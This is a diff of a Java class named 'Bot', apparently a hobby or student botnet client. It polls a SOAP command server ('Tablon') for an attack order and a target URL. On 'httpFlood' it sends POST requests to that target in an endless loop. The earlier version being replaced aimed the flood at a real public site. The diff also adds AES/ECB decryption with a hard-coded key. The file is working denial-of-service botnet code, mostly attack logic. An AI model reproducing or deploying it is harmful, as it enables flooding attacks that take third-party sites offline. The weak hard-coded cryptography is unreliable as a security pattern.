@@ -1,10 +1,19 @@
-
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+
+import javax.crypto.BadPaddingException;
+import javax.crypto.Cipher;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+import javax.crypto.ShortBufferException;
+import javax.crypto.spec.SecretKeySpec;
 
 import org.apache.axiom.om.OMAbstractFactory;
 import org.apache.axiom.om.OMElement;
@@ -22,37 +31,35 @@ import org.apache.commons.httpclient.MultiThreadedHttpConnectionManager;
 import org.apache.commons.httpclient.params.HttpConnectionManagerParams;
 
 public class Bot {
+	
+	
 	private static OMFactory omFactory = OMAbstractFactory.getOMFactory();
 	private static OMNamespace omNameSpace = omFactory.createOMNamespace("http://ws.apache.org/axis2", "nsTablon");
 	private static Options options = new Options();
 	private static String urlTablon = "http://192.168.0.13:7090/axis2/services/Tablon/";
-	private static String secreto = "bot";
-
-	public static void main(String[] args) {
-
+	
+	public static void main (String[] args){
 		boolean actuar = false;
-		Orden orden = null;
-		while (!actuar) {
-			try {
+		Comando comando = null;
+		while(!actuar){
+			try{
 				Thread.sleep(1000);
-			} catch (InterruptedException e) {
+			} catch(InterruptedException e){
 				e.printStackTrace();
 			}
-			orden = getComando();
-			if (!orden.getAccion().equals("")) {
+			comando = getComando();
+			if(comando != null && !comando.getAtaque().equals("")){
 				actuar = true;
-				System.out.println("voy a actuar");
+				System.out.println(comando);
 			}
 		}
-		System.out.println("Esta es mi orden: " + orden.getAccion());
-		atacar(orden);
+		System.out.println("---> " + comando.getAtaque());
+		atacar(comando);
 		
-		return;
-
 	}
-
-	private static Orden getComando() {
-		Orden comando = null;
+	
+	public static Comando getComando(){
+		Comando comando = null;
 
 		ServiceClient cliente = null;
 		try {
@@ -60,48 +67,54 @@ public class Bot {
 		} catch (AxisFault e) {
 			e.printStackTrace();
 		}
-
+		
 		options.setTo(new EndpointReference(urlTablon));
 		options.setAction("urn:obey");
 		options.activate(getConf());
+
 		cliente.setOptions(options);
-
-		OMElement metodo = omFactory.createOMElement("obey", omNameSpace);
-		OMElement parametro = omFactory.createOMElement("secreto", omNameSpace);
-		parametro.setText(secreto);
-		metodo.addChild(parametro);
-
+		
+		OMElement metodo = omFactory.createOMElement("getComando", omNameSpace);
 		OMElement respuesta = null;
 		try {
 			respuesta = cliente.sendReceive(metodo);
 		} catch (AxisFault e) {
+			System.out.println("ups...");
 			e.printStackTrace();
 		}
-		System.out.println("LEIDO COMANDO : " + respuesta.getText());
-		comando = getOrden(respuesta.getFirstElement().getText());
+		
+		OMElement elem = respuesta.getFirstElement();
+		System.out.println(elem.getText());
 		try {
-			cliente.cleanup();
-			cliente.cleanupTransport();
-		} catch (AxisFault e) {
+			comando = new Comando(elem.getText());
+		} catch (NumberFormatException | MalformedURLException | ArrayIndexOutOfBoundsException e) {
+			// TODO Auto-generated catch block
 			e.printStackTrace();
+			return new Comando("", null, 0);
 		}
-
+		
 		return comando;
 	}
-
-	private static Orden getOrden(String comando) {
-		Orden orden = new Orden(comando);
-		return orden;
+	
+	
+	private static void atacar(Comando comando) {
+		switch(comando.getAtaque()){
+		case "httpFlood":
+			httpFlood(comando);
+			break;
+		default:
+			break;
+		}
+		return;
 	}
-
-	private static void atacar(Orden orden) {
-		URL url = null;
+	
+	private static void httpFlood(Comando comando) {
+		URL url = comando.getObjetivo();
 		HttpURLConnection connection = null;
 		boolean seguir = true;
-		while (seguir) {
+		while (true) {
 			System.out.println("ENVIAR PETICION HTTP");
 			try {
-				url = new URL("https://www.tumblr.com/");
 				String urlParameters = "param1=" + URLEncoder.encode("???", "UTF-8") + "&param2="
 						+ URLEncoder.encode("???", "UTF-8");
 				connection = (HttpURLConnection) url.openConnection();
@@ -119,9 +132,51 @@ public class Bot {
 				e.printStackTrace();
 			}
 		}
-
 	}
-
+	
+	
+	public static void desencriptar(String cText, int cLen){
+		Cipher cipher = null;
+		byte[] plainText = new byte[cLen];
+		SecretKeySpec sKey = null;
+		byte[] pkey;
+		try {
+			pkey = "keykeykekeykeykekeykeykekeykeyke".getBytes("UTF-8");
+		
+		sKey = new SecretKeySpec(pkey, "AES");
+		cipher = Cipher.getInstance("AES/ECB/NoPadding");
+		cipher.init(Cipher.DECRYPT_MODE, sKey);
+		byte[] encoded = cText.getBytes("ISO-8859-1");
+		int plen = cipher.update(encoded, 0, cLen, plainText, 0);
+		plen += cipher.doFinal(plainText, plen);
+		System.out.println(" obtenida --> " + new String(plainText));
+		
+		
+		} catch (UnsupportedEncodingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (NoSuchAlgorithmException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (NoSuchPaddingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (IllegalBlockSizeException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (ShortBufferException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (BadPaddingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (InvalidKeyException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+	
+	
 	private static ConfigurationContext getConf() {
 
 		ConfigurationContext configurationContext = null;
@@ -143,4 +198,5 @@ public class Bot {
 		return configurationContext;
 	}
 
+	
 }
